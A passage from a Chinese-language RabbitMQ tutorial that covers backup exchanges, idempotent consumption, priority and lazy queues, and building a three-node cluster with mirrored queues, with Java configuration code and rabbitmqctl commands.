参数和回退消息，我们获得了对无法投递消息的感知能力，有机会在生产者的消息无法被投递时发现并处理。但有时候，我们并不知道该如何处理这些无法路由的消息，最多打个日志，然后触发报警，再来手动处理。而通过日志来处理这些无法路由的消息是很不优雅的做法，特别是当生产者所在的服务有多台机器的时候，手动复制日志会更加麻烦而且容易出错。而且设置mandatory参数会增加生产者的复杂性，需要添加处理这些被退回的消息的逻辑。如果既不想丢失消息，又不想增加生产者的复杂性，该怎么做呢?前面在设置死信队列的文章中，我们提到，可以为队列设置死信交换机来存储那些处理失败的消息，可是这些不可路由消息根本没有机会进入到队列，因此无法使用死信队列来保存消息。在RabbitMQ.中，有一种备份交换机的机制存在，可以很好的应对这个问题。什么是备份交换机呢?备份交换机可以理解为 RabbitMQ中交换机的“备胎”，当我们为某一个交换机声明一个对应的备份交换机时，就是为它创建一个备胎，当交换机接收到一条不可路由消息时，将会把这条消息转发到备份交换机中，由备份交换机来进行转发和处理，通常备份交换机的类型为Fanout，这样就能把所有消息都投递到与其绑定的队列中，然后我们在备份交换机下绑定一个队列，这样所有那些原交换机无法被路由的消息，就会都进入这个队列了。当然，我们还可以建立一个报警队列，用独立的消费者来进行监测和报警。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113153217940.png" alt="image-20230113153217940" /></p><ol><li><p>配置类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 配置类：发布确认（高级）</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfirmConfig</span> &#123;<br><br>    <span class="hljs-comment">//交换机</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;confirm_exchange&quot;</span>;<br>    <span class="hljs-comment">//队列</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;confirm_queue&quot;</span>;<br>    <span class="hljs-comment">//RoutingKey</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_routing_key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;key1&quot;</span>;<br>    <span class="hljs-comment">//备份交换机</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BACKUP_EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;backup_exchange&quot;</span>;<br>    <span class="hljs-comment">//备份队列</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BACKUP_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;backup_queue&quot;</span>;<br>    <span class="hljs-comment">//报警队列</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">WARNING_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;warning_queue&quot;</span>;<br><br>    <span class="hljs-comment">//声明交换机</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">confirmExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> ExchangeBuilder.directExchange(CONFIRM_EXCHANGE_NAME).durable(<span class="hljs-literal">true</span>)<br>                .withArgument(<span class="hljs-string">&quot;alternate-exchange&quot;</span>,BACKUP_EXCHANGE_NAME).build();<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">confirmQueue</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(CONFIRM_QUEUE_NAME).build();<br>    &#125;<br><br>    <span class="hljs-comment">//绑定</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueBindingExchange</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;confirmQueue&quot;)</span> Queue confirmQueue,</span><br><span class="hljs-params">                                        <span class="hljs-meta">@Qualifier(&quot;confirmExchange&quot;)</span>DirectExchange confirmExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(confirmQueue).to(confirmExchange).with(CONFIRM_routing_key);<br>    &#125;<br><br>    <span class="hljs-comment">//备份交换机</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> FanoutExchange <span class="hljs-title function_">backupExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FanoutExchange</span>(BACKUP_EXCHANGE_NAME);<br>    &#125;<br><br>    <span class="hljs-comment">//备份队列</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">backupQueue</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(BACKUP_QUEUE_NAME).build();<br>    &#125;<br><br>    <span class="hljs-comment">//报警队列</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">warningQueue</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(WARNING_QUEUE_NAME).build();<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">backupQueueBindingBackupExchange</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;backupQueue&quot;)</span> Queue backupQueue,</span><br><span class="hljs-params">                                                    <span class="hljs-meta">@Qualifier(&quot;backupExchange&quot;)</span> FanoutExchange backupExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(backupQueue).to(backupExchange);<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">warningQueueBindingBackupExchange</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;warningQueue&quot;)</span> Queue backupQueue,</span><br><span class="hljs-params">                                                    <span class="hljs-meta">@Qualifier(&quot;backupExchange&quot;)</span> FanoutExchange backupExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(backupQueue).to(backupExchange);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-comment">// 报警消费者</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WarningConsumer</span> &#123;<br><br>    <span class="hljs-comment">//接受报警消息</span><br>    <span class="hljs-meta">@RabbitListener(queues = ConfirmConfig.WARNING_QUEUE_NAME)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receiveWarningMsg</span><span class="hljs-params">(Message message)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());<br>        log.error(<span class="hljs-string">&quot;报警发现不可路由消息：&#123;&#125;&quot;</span>,msg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>重新启动项目的时候需要把原来的 confirm.exchange 删除因为我们修改了其绑定属性。</p></li><li><p>效果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113155426899.png" alt="image-20230113155426899" /></p></li><li><p>mandatory参数与备份交换机可以一起使用的时候，如果两者同时开启，消息究竟何去何从?谁优先级高，经过上面结果显示答案是<code>备份交换机优先级高</code>。</p></li></ol><h1 id="10-rabbitmq-其他知识点"><a class="markdownIt-Anchor" href="#10-rabbitmq-其他知识点"></a> <strong>10. RabbitMQ</strong> <strong>其他知识点</strong></h1><h2 id="101-幂等性"><a class="markdownIt-Anchor" href="#101-幂等性"></a> 10.1 幂等性</h2><blockquote><p>概念</p></blockquote><p>用户对于同一操作发起的一次请求或者多次请求的结果是一致的,不会因为多次点击而产生了副作用。举个最简单的例子，那就是支付，用户购买商品后支付，支付扣款成功，但是返回结果的时候网络异常，此时钱已经扣了，用户再次点击按钮，此时会进行第二次扣款，返回结果成功，用户查询余额发现多扣钱了，流水记录也变成了两条。在以前的单应用系统中，我们只需要把数据操作放入事务中即可，发生错误立即回滚，但是再响应客户端的时候也有可能出现网络中断或者异常等等</p><blockquote><p>解决思路</p></blockquote><ol><li><p>MQ消费者的幂等性的解决一般使用全局ID或者写个唯一标识比如时间戳或者UUID或者订单消费者消费MQ中的消息也可利用MQ的该id来判断，或者可按自己的规则生成一个全局唯一id，每次消费消息时用该id先判断该消息是否已消费过。</p></li><li><p>在海量订单生成的业务高峰期，生产端有可能就会重复发生了消息，这时候消费端就要实现幂等性，这就意味着我们的消息永远不会被消费多次,即使我们收到了一样的消息。业界主流的幂等性有两种操作:a.唯一ID+指纹码机制,利用数据库主键去重, b.利用redis的原子性去实现</p><ul><li><p><code>唯一ID+指纹码机制</code>：</p><p>指纹码:我们的一些规则或者时间戳加别的服务给到的唯一信息码,它并不一定是我们系统生成的，基本都是由我们的业务规则拼接而来，但是一定要保证唯一性，然后就利用查询语句进行判断这个id是否存在数据库中,优势就是实现简单就一个拼接，然后查询判断是否重复;劣势就是在高并发时，如果是单个数据库就会有写入性能瓶颈当然也可以采用分库分表提升性能，但也不是我们最推荐的方式。</p></li><li><p><code>Redis原子性</code>：</p><p>利用redis执行setnx命令，天然具有幂等性，从而实现不重复消费</p></li></ul></li></ol><h2 id="102-优先级队列"><a class="markdownIt-Anchor" href="#102-优先级队列"></a> 10.2 优先级队列</h2><blockquote><p>使用场景</p></blockquote><p>在我们系统中有一个订单催付的场景，我们的客户在天猫下的订单,淘宝会及时将订单推送给我们，如<br />果在用户设定的时间内未付款那么就会给用户推送一条短信提醒，很简单的一个功能对吧，但是，tmall商家对我们来说，肯定是要分大客户和小客户的对吧，比如像苹果，小米这样大商家一年起码能给我们创造很大的利润，所以理应当然，他们的订单必须得到优先处理，而曾经我们的后端系统是使用redis.,来存放的定时轮询，大家都知道redis,只能用List做一个简简单单的消息队列，并不能实现一个优先级的场景，所以订单量大了后采用RabbitMQ进行改造和优化,如果发现是大客户的订单给一个相对比较高的优先级，否则就是默认优先级。</p><blockquote><p>如何添加</p></blockquote><ol><li><p>控制台页面添加</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113160255482.png" alt="image-20230113160255482" /></p></li><li><p>队列中代码添加优先级</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, Object&gt; params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>params.put(<span class="hljs-string">&quot;x-max-priority&quot;</span>,<span class="hljs-number">10</span>);<br>channel.queueDeclare(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,params);<br></code></pre></td></tr></table></figure></li><li><p>消息中代码添加优先级</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>        <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().priority(<span class="hljs-number">5</span>).build();<br></code></pre></td></tr></table></figure></li><li><p><strong>注意事项</strong></p><p>要让队列实现优先级需要做的事情有如下事情:队列需要设置为优先级队列，消息需要设置消息的优先级，消费者需要等待消息已经发送到队列中才去消费因为，这样才有机会对消息进行排序</p></li></ol><blockquote><p>代码实现</p></blockquote><ol><li><p>生产者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> &#123;<br>    <span class="hljs-comment">// 队列名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">final</span> String QUEUE_NAME=<span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// 发消息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-comment">// 创建一个连接工厂</span><br>        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();<br><br>        <span class="hljs-comment">// 工厂IP连接RabbitMQ的队列</span><br>        factory.setHost(<span class="hljs-string">&quot;192.168.163.128&quot;</span>);<br>        <span class="hljs-comment">// 用户名</span><br>        factory.setUsername(<span class="hljs-string">&quot;admin&quot;</span>);<br>        <span class="hljs-comment">// 密码</span><br>        factory.setPassword(<span class="hljs-string">&quot;123&quot;</span>);<br><br>        <span class="hljs-comment">// 创建连接</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> factory.newConnection();<br>        <span class="hljs-comment">// 获取信道</span><br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br>        <br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//官方允许是0-255之间，此处设置10，允许优化级范围为0-10，不要设置过大，浪费CPU与内存</span><br>        arguments.put(<span class="hljs-string">&quot;x-max-priority&quot;</span>,<span class="hljs-number">10</span>);<br>        channel.queueDeclare(QUEUE_NAME,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,arguments);<br>        <span class="hljs-comment">// 发消息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            <span class="hljs-keyword">if</span>(i == <span class="hljs-number">5</span>)&#123;<br>                AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().priority(<span class="hljs-number">5</span>).build();<br>                channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,QUEUE_NAME,properties,message.getBytes(StandardCharsets.UTF_8));<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,QUEUE_NAME,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br><br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;消息发送完毕！&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer</span> &#123;<br>    <span class="hljs-comment">// 队列名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// 接受消息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-comment">// 创建连接工厂</span><br>        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();<br><br>        factory.setHost(<span class="hljs-string">&quot;192.168.163.128&quot;</span>);<br>        factory.setUsername(<span class="hljs-string">&quot;admin&quot;</span>);<br>        factory.setPassword(<span class="hljs-string">&quot;123&quot;</span>);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> factory.newConnection();<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br>        <span class="hljs-comment">// 声明 接受消息</span><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br>        <span class="hljs-comment">// 声明 取消消息</span><br>        <span class="hljs-type">CancelCallback</span> <span class="hljs-variable">cancelCallback</span> <span class="hljs-operator">=</span> consumer -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;消息消费被中断&quot;</span>);<br>        &#125;;<br>        System.out.println(<span class="hljs-string">&quot;C2等待接受消息.......&quot;</span>);<br>        channel.basicConsume(QUEUE_NAME,<span class="hljs-literal">true</span>,deliverCallback,cancelCallback);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>效果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161112295.png" alt="image-20230113161112295" /></p></li></ol><h2 id="103-惰性队列"><a class="markdownIt-Anchor" href="#103-惰性队列"></a> 10.3 惰性队列</h2><blockquote><p>使用场景</p></blockquote><p>RabbitMQ从 3.6.0版本开始引入了惰性队列的概念。惰性队列会尽可能的将消息存入磁盘中，而在消费者消费到相应的消息时才会被加载到内存中，它的一个重要的设计目标是能够支持更长的队列，即支持更多的消息存储。当消费者由于各种各样的原因(比如消费者下线、宕机亦或者是由于维护而关闭等)而致使长时间内不能消费消息造成堆积时，惰性队列就很有必要了。</p><p>默认情况下，当生产者将消息发送到RabbitMQ的时候，队列中的消息会尽可能的存储在内存之中，这样可以更加快速的将消息发送给消费者。即使是持久化的消息，在被写入磁盘的同时也会在内存中驻留一份备份。当RabbitMQ需要释放内存的时候，会将内存中的消息换页至磁盘中，这个操作会耗费较长的时间，也会阻塞队列的操作，进而无法接收新的消息。虽然 RabbitMQ的开发者们一直在升级相关的算法，但是效果始终不太理想，尤其是在消息量特别大的时候。</p><blockquote><p>两种模式</p></blockquote><p>队列具备两种模式: default和lazy.默认的为default模式，在3.6.0之前的版本无需做任何变更。lazy_模式即为惰性队列的模式，可以通过调用channel.queueDecare方法的时候在参数中设置，也可以通过<br />Policy的方式设置，如果一个队列同时使用这两种方式设置的话，那么Policy的方式具备更高的优先级。如果要通过声明的方式改变已有队列的模式的话，那么只能先删除队列，然后再重新声明一个新的。<br />在队列声明的时候可以通过&quot;x-queue-mode&quot;参数来设置队列的模式，取值为&quot;default&quot;和&quot;lazy”&quot;。下面示例中演示了一个惰性队列的声明细节:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, Object&gt; args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>args.put(<span class="hljs-string">&quot;x-queue-mode&quot;</span>,<span class="hljs-string">&quot;lazy&quot;</span>);<br>channel.queueDeclare( <span class="hljs-string">&quot;myqueue&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>,args);<br></code></pre></td></tr></table></figure><blockquote><p>内存对比</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161421416.png" alt="image-20230113161421416" /></p><p>在发送1百万条消息，每条消息大概占1KB的情况下，普通队列占用内存是1.2GB,而惰性队列仅仅占用1.5MB</p><h1 id="11-rabbitmq集群"><a class="markdownIt-Anchor" href="#11-rabbitmq集群"></a> 11. RabbitMQ集群</h1><h2 id="111-搭建集群"><a class="markdownIt-Anchor" href="#111-搭建集群"></a> 11.1 搭建集群</h2><blockquote><p>步骤</p></blockquote><ol><li><p>克隆三台虚拟机 ，修改三台机器的名称为node1、node2、node3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/hosts<br>node1<br>node2<br>node3<br></code></pre></td></tr></table></figure></li><li><p>修改三台机器的hosts文件中的名称，让各个节点都能互相识别对象</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/hosts<br>192.168.163.128 node1<br>192.168.163.132 node2<br>193.168.163.131 node3<br></code></pre></td></tr></table></figure></li><li><p>以确保各个节点的cookie文件使用的是同一个值：在node1上执行远程操作命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">scp /var/lib/rabbitmq/.erlang.cookie root@node2:/var/lib/rabbitmq/.erlang.cookie<br>scp /var/lib/rabbitmq/.erlang.cookie root@node3:/var/lib/rabbitmq/.erlang.cookie<br></code></pre></td></tr></table></figure></li><li><p>启动RabbitMQ服务，顺带启动Erlang虚拟机和RabbitMQ应用服务，三台节点下执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rabbitmq-server -detached<br></code></pre></td></tr></table></figure></li><li><p>在节点2执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">rabbitmqctl stop会将Erlang虚拟机关闭  rabbitmqctl stop_app 只关闭rabbitmq服务</span><br>rabbitmqctl stop_app<br>rabbitmqctl reset<br>rabbitmqctl join_cluster rabbit@node1<br><span class="hljs-meta prompt_"># </span><span class="language-bash">只启动rabbitmq服务</span><br>rabbitmqctl start_app<br></code></pre></td></tr></table></figure></li><li><p>在节点3执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">rabbitmqctl stop_app<br>rabbitmqctl reset<br>rabbitmqctl join_cluster rabbit@node2<br>rabbitmqctl start_app<br></code></pre></td></tr></table></figure></li><li><p>查看集群状态</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rabbitmqctl cluster_status<br></code></pre></td></tr></table></figure></li><li><p>需要重新设置用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建账号</span><br>rabbitmqctl add_user admin 123<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置用户角色</span><br>rabbitmqctl set_user_tags admin administrator<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置用户权限</span><br>rabbitmqctl set_permissions -p &quot;/&quot; admin &quot;.*&quot; &quot;.*&quot; &quot;.*&quot; <br></code></pre></td></tr></table></figure><p>之后在三个集群节点的任意一个可视化界面登录均可</p></li><li><p>接触集群节点，node2和node3分别执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">rabbitmqctl stop_app<br>rabbitmqctl reset<br>rabbitmqctl start_app<br>rabbitmqctl cluster_status<br><span class="hljs-meta prompt_"># </span><span class="language-bash">此项命令均在node1上执行</span><br>rabbitmqctl forget_cluster_node rabbit@node2<br></code></pre></td></tr></table></figure></li></ol><h2 id="112-镜像队列"><a class="markdownIt-Anchor" href="#112-镜像队列"></a> 11.2 镜像队列</h2><blockquote><p>使用镜像的原因</p></blockquote><p>如果RabbitMQ集群中只有一个Broker节点，那么该节点的失效将导致整体服务的临时性不可用，并且也可能会导致消息的丢失。可以将所有消息都设置为持久化,并且对应队列的durable属性也设置为true,但是这样仍然无法避免由于缓存导致的问题:因为消息在发送之后和被写入磁盘井执行刷盘动作之间存在一个短暂却会产生问题的时间窗。通过publisherconfirm机制能够确保客户端知道哪些消息己经存入磁盘，尽管如此，一般不希望遇到因单点故障导致的服务不可用。<br />引入镜像队列（Mirror Queue）的机制，可以将队列镜像到集群中的其他Broker节点之上，如果集群中的一个节点失效了，队列能自动地切换到镜像中的另一个节点上以保证服务的可用性。</p><blockquote><p>搭建步骤</p></blockquote><ol><li><p>启动三台集群节点</p></li><li><p>随便找一个节点添加policy</p></li><li><p>在node1创建一个队列发噢是那个一条信息，队列存在镜像队列</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113161708382.png" alt="image-20230113161708382" 